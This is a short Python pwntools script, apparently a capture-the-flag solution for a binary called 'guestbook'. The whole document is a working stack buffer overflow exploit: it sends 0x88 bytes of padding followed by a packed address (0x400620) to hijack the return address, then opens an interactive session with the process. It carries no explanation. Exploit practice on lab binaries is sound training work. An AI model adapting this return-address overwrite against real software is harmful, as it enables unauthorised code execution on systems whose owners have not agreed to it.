from pwn import *
context(log_level='debug')
io = process("./guestbook")
fun_add = 0x400620
io.recv()
payload = 'a'*(0x88)+ p64(fun_add)
io.sendline(payload)
io.recv()
io.interactive()